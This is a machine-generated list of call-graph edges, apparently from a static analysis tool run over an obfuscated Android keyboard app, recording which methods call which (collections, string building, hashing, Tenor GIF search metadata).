SPECIAL edge: specialinvoke r0.<lkh: void <init>()>() in <lkq: void <init>()> ==> <lkh: void <init>()>
INTERFACE edge: $r5 = interfaceinvoke $r10.<java.util.Iterator: java.lang.Object next()>() in <hbv: void j()> ==> <lnc: java.lang.Object next()>
VIRTUAL edge: virtualinvoke $r3.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>($r1) in <izw: void aq(java.lang.Object,java.lang.Object)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>
STATIC edge: $i2 = staticinvoke <java.lang.System: int identityHashCode(java.lang.Object)>($r3) in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.System: int identityHashCode(java.lang.Object)>
INTERFACE edge: $r3 = interfaceinvoke $r2.<java.util.Map: java.lang.Object get(java.lang.Object)>($r3) in <ljb: java.lang.Object getValue()> ==> <java.util.LinkedHashMap: java.lang.Object get(java.lang.Object)>
SPECIAL edge: specialinvoke $r2.<java.util.concurrent.atomic.AtomicInteger: void <init>()>() in <lsu: void <init>()> ==> <java.util.concurrent.atomic.AtomicInteger: void <init>()>
SPECIAL edge: specialinvoke $r0.<java.lang.IndexOutOfBoundsException: void <init>(java.lang.String)>($r1) in <iye: void Q(int,int)> ==> <java.lang.IndexOutOfBoundsException: void <init>(java.lang.String)>
VIRTUAL edge: virtualinvoke $r3.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>($r4) in <mly: java.lang.IllegalArgumentException f()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>
SPECIAL edge: specialinvoke $r6.<j$.util.concurrent.c: void <init>(long)>($l0) in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <j$.util.concurrent.c: void <init>(long)>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r2) in <izw: void as(int,java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r3 = virtualinvoke $r2.<java.lang.ThreadLocal: java.lang.Object get()>() in <j$.util.concurrent.ThreadLocalRandom: void c()> ==> <java.lang.ThreadLocal: java.lang.Object get()>
VIRTUAL edge: $r1 = virtualinvoke r0.<ljd: java.util.Map o()>() in <ljd: java.util.Iterator l()> ==> <ljd: java.util.Map o()>
INTERFACE edge: $z0 = interfaceinvoke $r1.<java.util.Iterator: boolean hasNext()>() in <llg: boolean hasNext()> ==> <lsb: boolean hasNext()>
VIRTUAL edge: virtualinvoke $r3.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("=null") in <izw: void aq(java.lang.Object,java.lang.Object)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke $r3.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>($r4) in <mly: java.lang.IllegalArgumentException f()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>
STATIC edge: staticinvoke <iye: void y(boolean,java.lang.Object)>($z0, "collection too large") in <lma: int e(int)> ==> <iye: void y(boolean,java.lang.Object)>
VIRTUAL edge: $r2 = virtualinvoke $r2.<java.lang.String: java.lang.String concat(java.lang.String)>($r4) in <ivw: java.lang.String p()> ==> <java.lang.String: java.lang.String concat(java.lang.String)>
VIRTUAL edge: $r2 = virtualinvoke $r1.<java.lang.Class: java.lang.Object cast(java.lang.Object)>($r2) in <lsz: java.lang.Object d(java.lang.Object)> ==> <java.lang.Class: java.lang.Object cast(java.lang.Object)>
VIRTUAL edge: $r5 = virtualinvoke $r0.<hcb: java.lang.Object l(java.lang.String,ldp)>($r2, $r4) in <hbu: hbs f(java.lang.String,long)> ==> <hcb: java.lang.Object l(java.lang.String,ldp)>
STATIC edge: staticinvoke <java.util.Arrays: void fill(short[],short)>($r7, $s8) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.util.Arrays: void fill(short[],short)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lid: int hashCode()> ==> <lrg: int hashCode()>
INTERFACE edge: $r8 = interfaceinvoke $r9.<lse: lsw j(java.lang.String,java.lang.String,int,java.lang.String)>("com/google/android/libraries/inputmethod/utils/LanguageTag", "extractLanguageAndCountryFromLocale", 260, "LanguageTag.java") in <ivw: ivw d(java.util.Locale)> ==> <lsv: lsw j(java.lang.String,java.lang.String,int,java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<lma: boolean d()>() in <lma: boolean equals(java.lang.Object)> ==> <lma: boolean d()>
VIRTUAL edge: $r4 = virtualinvoke $r5.<java.lang.StringBuilder: java.lang.String toString()>() in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.String toString()>
STATIC edge: $r2 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
STATIC edge: $r5 = staticinvoke <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l m(j$.util.concurrent.l[],int)>($r4, $i0) in <j$.util.concurrent.ConcurrentHashMap: void p(j$.util.concurrent.l[],int)> ==> <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l m(j$.util.concurrent.l[],int)>
SPECIAL edge: specialinvoke $r2.<java.lang.NullPointerException: void <init>(java.lang.String)>("Both parameters are null") in <iye: java.lang.Object V(java.lang.Object,java.lang.Object)> ==> <java.lang.NullPointerException: void <init>(java.lang.String)>
STATIC edge: $r1 = staticinvoke <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>($r1, $i0) in <lkt: void e(int)> ==> <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>
SPECIAL edge: specialinvoke r0.<lsa: void <init>()>() in <lnc: void <init>(java.lang.Object)> ==> <lsa: void <init>()>
SPECIAL edge: specialinvoke $r25.<j$.util.concurrent.l: void <init>(int,java.lang.Object,java.lang.Object,j$.util.concurrent.l)>($i5, $r15, $r16, $r12) in <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])> ==> <j$.util.concurrent.l: void <init>(int,java.lang.Object,java.lang.Object,j$.util.concurrent.l)>
VIRTUAL edge: $r3 = virtualinvoke $r2.<java.lang.StringBuilder: java.lang.String toString()>() in <iye: void O(int,int)> ==> <java.lang.StringBuilder: java.lang.String toString()>
SPECIAL edge: specialinvoke $r0.<java.util.ArrayList: void <init>()>() in <lri: java.util.ArrayList N()> ==> <java.util.ArrayList: void <init>()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <java.lang.String: void <init>(char[],int,int)> ==> <java.lang.Object: void <init>()>
STATIC edge: $r1 = staticinvoke <idq: idq a(java.lang.String,mag)>("TenorStaticImage", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
INTERFACE edge: $r3 = interfaceinvoke $r7.<java.util.Iterator: java.lang.Object next()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <liz: java.lang.Object next()>
VIRTUAL edge: $i3 = virtualinvoke $r2.<java.lang.String: int indexOf(java.lang.String,int)>("%s", $i1) in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.String: int indexOf(java.lang.String,int)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lqr: int hashCode()>
INTERFACE edge: $z0 = interfaceinvoke $r5.<java.util.Iterator: boolean hasNext()>() in <lri: boolean V(java.util.List,java.lang.Object)> ==> <lsb: boolean hasNext()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r3) in <lma: lma i(int,java.lang.Object[])> ==> <java.lang.Object: boolean equals(java.lang.Object)>
VIRTUAL edge: $r3 = virtualinvoke r0.<ljd: java.lang.Object k(int)>($i0) in <ljd: java.util.Map m()> ==> <ljd: java.lang.Object k(int)>
STATIC edge: $r2 = staticinvoke <java.lang.reflect.Array: java.lang.Object newInstance(java.lang.Class,int)>($r1, $i0) in <lri: java.lang.Object[] o(java.lang.Object[],int)> ==> <java.lang.reflect.Array: java.lang.Object newInstance(java.lang.Class,int)>
STATIC edge: $r1 = staticinvoke <idq: idq a(java.lang.String,mag)>("TenorAnimatedImage", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
VIRTUAL edge: $r12 = virtualinvoke r0.<lsn: lts l()>() in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <lsn: lts l()>
STATIC edge: $r7 = staticinvoke <java.util.regex.Pattern: java.util.regex.Pattern compile(java.lang.String)>("\\p{Punct}*") in <iwt: void <clinit>()> ==> <java.util.regex.Pattern: java.util.regex.Pattern compile(java.lang.String)>
INTERFACE edge: $r3 = interfaceinvoke $r7.<java.util.Iterator: java.lang.Object next()>() in <lmb: lme f()> ==> <lsb: java.lang.Object next()>
INTERFACE edge: $r5 = interfaceinvoke $r10.<java.util.Iterator: java.lang.Object next()>() in <hbv: void j()> ==> <lsb: java.lang.Object next()>
VIRTUAL edge: $r3 = virtualinvoke $r1.<java.lang.Object: java.lang.Class getClass()>() in <lkh: java.lang.Object[] toArray(java.lang.Object[])> ==> <java.lang.Object: java.lang.Class getClass()>
SPECIAL edge: specialinvoke $r0.<jlu: void <init>(int)>(8) in <jlu: void <clinit>()> ==> <jlu: void <init>(int)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lsa: void <init>()> ==> <java.lang.Object: void <init>()>
SPECIAL edge: specialinvoke $r2.<java.lang.StringBuilder: void <init>()>() in <iye: void O(int,int)> ==> <java.lang.StringBuilder: void <init>()>
VIRTUAL edge: virtualinvoke r0.<lsn: void q(lsz,java.lang.Object)>($r3, $r6) in <lsd: boolean b(lsr)> ==> <lsn: void q(lsz,java.lang.Object)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lma: boolean equals(java.lang.Object)> ==> <lkq: int hashCode()>
VIRTUAL edge: virtualinvoke $r3.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("=") in <mly: java.lang.IllegalArgumentException f()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<lly: void <init>()>() in <lma: lly g()> ==> <lly: void <init>()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r0) in <kzs: boolean d(java.lang.Object,java.lang.Object)> ==> <lma: boolean equals(java.lang.Object)>
VIRTUAL edge: virtualinvoke $r2.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("negative size: ") in <iye: void O(int,int)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lma: boolean equals(java.lang.Object)>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.lang.String: int hashCode()>
INTERFACE edge: $r5 = interfaceinvoke $r10.<java.util.Iterator: java.lang.Object next()>() in <hbv: void j()> ==> <llg: java.lang.Object next()>
VIRTUAL edge: $z2 = virtualinvoke $r2.<j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>(r0, $l3, 0, 1) in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(" [") in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $i0 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lid: int hashCode()> ==> <java.lang.Object: int hashCode()>
SPECIAL edge: specialinvoke r0.<lmp: void <init>()>() in <lmo: void <init>(java.util.Comparator)> ==> <lmp: void <init>()>
VIRTUAL edge: $r3 = virtualinvoke $r14.<lkl: lkq g()>() in <hbw: java.lang.Object a(java.lang.Object)> ==> <lkl: lkq g()>
SPECIAL edge: specialinvoke $r0.<dwx: void <init>(int)>(6) in <dwx: void <clinit>()> ==> <dwx: void <init>(int)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <j$.util.concurrent.k: boolean equals(java.lang.Object)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
INTERFACE edge: $r4 = interfaceinvoke $r0.<java.util.List: java.util.Iterator iterator()>() in <lri: boolean V(java.util.List,java.lang.Object)> ==> <lkq: java.util.Iterator iterator()>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
STATIC edge: $i1 = staticinvoke <java.lang.System: int identityHashCode(java.lang.Object)>($r1) in <j$.util.concurrent.r: int i(java.lang.Object,java.lang.Object)> ==> <java.lang.System: int identityHashCode(java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)> ==> <lsp: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<java.util.LinkedHashSet: void <init>(java.util.Collection)>($r2) in <ose: void <clinit>()> ==> <java.util.LinkedHashSet: void <init>(java.util.Collection)>
INTERFACE edge: $z0 = interfaceinvoke $r1.<java.util.Iterator: boolean hasNext()>() in <llg: java.lang.Object next()> ==> <lsb: boolean hasNext()>
VIRTUAL edge: virtualinvoke $r4.<java.lang.StringBuilder: java.lang.StringBuilder append(int)>($i1) in <iye: java.lang.String X(int,int,java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(int)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r3) in <lma: lma i(int,java.lang.Object[])> ==> <lid: boolean equals(java.lang.Object)>
INTERFACE edge: $r3 = interfaceinvoke $r2.<java.util.List: java.lang.Object get(int)>($i1) in <lri: boolean V(java.util.List,java.lang.Object)> ==> <lql: java.lang.Object get(int)>
VIRTUAL edge: $r2 = virtualinvoke $r1.<ljd: java.util.Map o()>() in <ljb: java.lang.Object getValue()> ==> <ljd: java.util.Map o()>
VIRTUAL edge: $i0 = virtualinvoke r0.<lkh: int size()>() in <lkh: java.lang.Object[] toArray(java.lang.Object[])> ==> <lqr: int size()>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r3.<j$.util.concurrent.d: void <init>(j$.util.concurrent.l[],int,int,j$.util.concurrent.ConcurrentHashMap)>($r2, $i0, $i0, $r1) in <j$.util.concurrent.e: java.util.Iterator iterator()> ==> <j$.util.concurrent.d: void <init>(j$.util.concurrent.l[],int,int,j$.util.concurrent.ConcurrentHashMap)>
STATIC edge: $r1 = staticinvoke <lma: lma i(int,java.lang.Object[])>($i0, $r2) in <lma: lma p(java.util.Collection)> ==> <lma: lma i(int,java.lang.Object[])>
SPECIAL edge: specialinvoke $r2.<java.lang.String: void <init>(char[])>($r1) in <iwt: java.lang.String d(java.lang.String)> ==> <java.lang.String: void <init>(char[])>
VIRTUAL edge: $z0 = virtualinvoke $r5.<java.lang.Object: boolean equals(java.lang.Object)>($r3) in <lsd: boolean b(lsr)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r18.<mag: void <init>(java.lang.String,int,int)>("EXPRESSIVE_STICKER_SEARCH", 18, 18) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r0) in <kzs: boolean d(java.lang.Object,java.lang.Object)> ==> <java.util.AbstractMap$SimpleImmutableEntry: boolean equals(java.lang.Object)>
INTERFACE edge: $r3 = interfaceinvoke $r7.<java.util.Iterator: java.lang.Object next()>() in <lqs: boolean equals(java.lang.Object)> ==> <lsb: java.lang.Object next()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
VIRTUAL edge: $r1 = virtualinvoke $r2.<lkx: lma q()>() in <llo: lma u()> ==> <lkx: lma q()>
SPECIAL edge: specialinvoke $r4.<liw: void <init>(ljd)>(r0) in <ljd: java.util.Iterator l()> ==> <liw: void <init>(ljd)>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.lang.Object: int hashCode()>
SPECIAL edge: specialinvoke r0.<lid: void <init>()>() in <lki: void <init>(java.lang.Object,java.lang.Object)> ==> <lid: void <init>()>
SPECIAL edge: specialinvoke $r1.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Throwable: void <init>()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
STATIC edge: $i2 = staticinvoke <java.lang.Math: int max(int,int)>($i2, $i0) in <kwe: int U(int,int,int)> ==> <java.lang.Math: int max(int,int)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lkx: void <init>()> ==> <java.lang.Object: void <init>()>
SPECIAL edge: specialinvoke $r9.<mly: void <init>(java.lang.Object,java.lang.Object,java.lang.Object)>($r2, $r3, $r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <mly: void <init>(java.lang.Object,java.lang.Object,java.lang.Object)>
VIRTUAL edge: virtualinvoke $r3.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("null key in entry: null=") in <izw: void aq(java.lang.Object,java.lang.Object)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r9 = virtualinvoke $r7.<mly: java.lang.IllegalArgumentException f()>() in <lqq: lqq r(int,java.lang.Object[],lkt)> ==> <mly: java.lang.IllegalArgumentException f()>
VIRTUAL edge: virtualinvoke $r3.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(" and ") in <mly: java.lang.IllegalArgumentException f()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: $r1 = staticinvoke <izw: java.lang.Object al(int)>($i4) in <ljd: int z(int,int,int,int)> ==> <izw: java.lang.Object al(int)>
SPECIAL edge: specialinvoke $r1.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r2) in <iye: void y(boolean,java.lang.Object)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Enum: int hashCode()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r10.<java.lang.StringBuilder: void <init>(int)>($i1) in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: void <init>(int)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lid: int hashCode()> ==> <java.lang.Object: int hashCode()>
STATIC edge: $r0 = staticinvoke <iye: java.lang.String r(java.lang.String,java.lang.Object[])>("%s (%s) must not be negative", $r1) in <iye: java.lang.String X(int,int,java.lang.String)> ==> <iye: java.lang.String r(java.lang.String,java.lang.Object[])>
STATIC edge: $r0 = staticinvoke <j$.util.concurrent.r: j$.util.concurrent.s h(j$.util.concurrent.s,j$.util.concurrent.s)>($r0, $r3) in <j$.util.concurrent.r: j$.util.concurrent.s c(j$.util.concurrent.s,j$.util.concurrent.s)> ==> <j$.util.concurrent.r: j$.util.concurrent.s h(j$.util.concurrent.s,j$.util.concurrent.s)>
VIRTUAL edge: $r1 = virtualinvoke r0.<ljd: java.lang.Object[] y()>() in <ljd: java.lang.Object k(int)> ==> <ljd: java.lang.Object[] y()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r0) in <kzs: boolean d(java.lang.Object,java.lang.Object)> ==> <lkq: boolean equals(java.lang.Object)>
VIRTUAL edge: $i1 = virtualinvoke r0.<lkh: int c()>() in <lkh: java.lang.Object[] toArray(java.lang.Object[])> ==> <lqr: int c()>
STATIC edge: $r5 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
VIRTUAL edge: $r2 = virtualinvoke r0.<ljf: java.util.Set g()>() in <ljf: boolean add(java.lang.Object)> ==> <ljf: java.util.Set g()>
VIRTUAL edge: $i0 = virtualinvoke $r7.<lsm: int a(lsz)>($r3) in <lsd: boolean b(lsr)> ==> <lsm: int a(lsz)>
STATIC edge: $r1 = staticinvoke <izw: java.lang.Object al(int)>($i1) in <ljd: int b()> ==> <izw: java.lang.Object al(int)>
SPECIAL edge: specialinvoke $r0.<java.lang.StringBuilder: void <init>()>() in <izw: java.lang.Object al(int)> ==> <java.lang.StringBuilder: void <init>()>
VIRTUAL edge: virtualinvoke r0.<ljd: void t(int)>($i6) in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <ljd: void t(int)>
INTERFACE edge: interfaceinvoke $r5.<java.util.Collection: boolean add(java.lang.Object)>($r2) in <lli: void e(java.lang.Object,java.lang.Object)> ==> <ljf: boolean add(java.lang.Object)>
VIRTUAL edge: $i0 = virtualinvoke r0.<lmo: int a(java.lang.Object,java.lang.Object)>($r3, $r8) in <lqs: boolean equals(java.lang.Object)> ==> <lmo: int a(java.lang.Object,java.lang.Object)>
STATIC edge: $i3 = staticinvoke <izw: int aj(java.lang.Object,int)>($r2, $i2) in <ljd: int f(java.lang.Object)> ==> <izw: int aj(java.lang.Object,int)>
STATIC edge: $i9 = staticinvoke <izw: int af(int,int)>($i2, $i4) in <ljf: boolean add(java.lang.Object)> ==> <izw: int af(int,int)>
STATIC edge: $r1 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r1) in <ljd: java.lang.Object j()> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Boolean: java.lang.Boolean valueOf(boolean)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Object: void <init>()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r2.<java.util.NoSuchElementException: void <init>()>() in <lsb: java.lang.Object next()> ==> <java.util.NoSuchElementException: void <init>()>
VIRTUAL edge: $i8 = virtualinvoke $r13.<lvq: int size()>() in <lvr: void <init>(lvr,lvr)> ==> <lvq: int size()>
SPECIAL edge: specialinvoke $r15.<lme: void <init>(lkx,int)>($r12, $i0) in <lmb: lme f()> ==> <lme: void <init>(lkx,int)>
VIRTUAL edge: virtualinvoke $r7.<java.lang.StringBuilder: java.lang.StringBuilder append(int)>($i0) in <nzh: boolean f(ivv)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(int)>
SPECIAL edge: specialinvoke r0.<java.lang.Exception: void <init>()>() in <java.lang.RuntimeException: void <init>()> ==> <java.lang.Exception: void <init>()>
VIRTUAL edge: $r2 = virtualinvoke r0.<ljf: java.util.Set f()>() in <ljf: boolean add(java.lang.Object)> ==> <ljf: java.util.Set f()>
SPECIAL edge: specialinvoke $r5.<mag: void <init>(java.lang.String,int,int)>("TENOR_GIF_SEARCH_METADATA", 5, 5) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
INTERFACE edge: $i0 = interfaceinvoke $r0.<java.util.List: int size()>() in <lri: boolean V(java.util.List,java.lang.Object)> ==> <lql: int size()>
VIRTUAL edge: $i1 = virtualinvoke $r1.<lkq: int size()>() in <lkm: void <init>(lkq,int)> ==> <lqp: int size()>
STATIC edge: $r5 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
STATIC edge: $z2 = staticinvoke <lvm: boolean i(char)>($c1) in <lsz: void <init>(java.lang.String,java.lang.Class,boolean,boolean)> ==> <lvm: boolean i(char)>
STATIC edge: staticinvoke <j$.util.concurrent.ConcurrentHashMap: void j(j$.util.concurrent.l[],int,j$.util.concurrent.l)>($r2, $i7, $r10) in <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])> ==> <j$.util.concurrent.ConcurrentHashMap: void j(j$.util.concurrent.l[],int,j$.util.concurrent.l)>
VIRTUAL edge: $r4 = virtualinvoke $r5.<java.lang.StringBuilder: java.lang.String toString()>() in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.String toString()>
SPECIAL edge: specialinvoke r0.<lkq: void <init>()>() in <lql: void <init>(java.lang.Object[],int)> ==> <lkq: void <init>()>
STATIC edge: $r1 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r1) in <lqp: java.lang.Object get(int)> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<hbw: void <init>(int)>(9) in <hbw: void <clinit>()> ==> <hbw: void <init>(int)>
STATIC edge: $r0 = staticinvoke <j$.sun.misc.b: j$.sun.misc.b h()>() in <j$.util.concurrent.r: void <clinit>()> ==> <j$.sun.misc.b: j$.sun.misc.b h()>
VIRTUAL edge: $r7 = virtualinvoke $r9.<java.lang.StringBuilder: java.lang.String toString()>() in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $r7 = virtualinvoke $r9.<java.lang.StringBuilder: java.lang.String toString()>() in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.String toString()>
STATIC edge: $i6 = staticinvoke <izw: int af(int,int)>($i3, $i4) in <ljf: boolean add(java.lang.Object)> ==> <izw: int af(int,int)>
SPECIAL edge: specialinvoke $r9.<mly: void <init>(java.lang.Object,java.lang.Object,java.lang.Object)>($r2, $r3, $r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <mly: void <init>(java.lang.Object,java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke $r2.<java.util.WeakHashMap: void <init>()>() in <gwk: void <init>()> ==> <java.util.WeakHashMap: void <init>()>
VIRTUAL edge: $i0 = virtualinvoke $r1.<ljd: int f(java.lang.Object)>($r2) in <ljb: void a()> ==> <ljd: int f(java.lang.Object)>
SPECIAL edge: specialinvoke $r2.<lmc: void <init>(lme)>(r0) in <lme: lma c()> ==> <lmc: void <init>(lme)>
VIRTUAL edge: $r1 = virtualinvoke r0.<ljd: java.util.Map n(int)>($i0) in <ljd: java.util.Map m()> ==> <ljd: java.util.Map n(int)>
VIRTUAL edge: $i0 = virtualinvoke $r1.<ljd: int c()>() in <liz: void <init>(ljd)> ==> <ljd: int c()>
SPECIAL edge: specialinvoke $r3.<java.lang.StringBuilder: void <init>()>() in <mly: java.lang.IllegalArgumentException f()> ==> <java.lang.StringBuilder: void <init>()>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Integer: int highestOneBit(int)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <lrg: int hashCode()>
SPECIAL edge: specialinvoke $r6.<lrg: void <init>(java.lang.Object)>($r1) in <lma: lma i(int,java.lang.Object[])> ==> <lrg: void <init>(java.lang.Object)>
SPECIAL edge: specialinvoke $r10.<java.lang.StringBuilder: void <init>()>() in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: void <init>()>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.util.AbstractSet: boolean equals(java.lang.Object)>
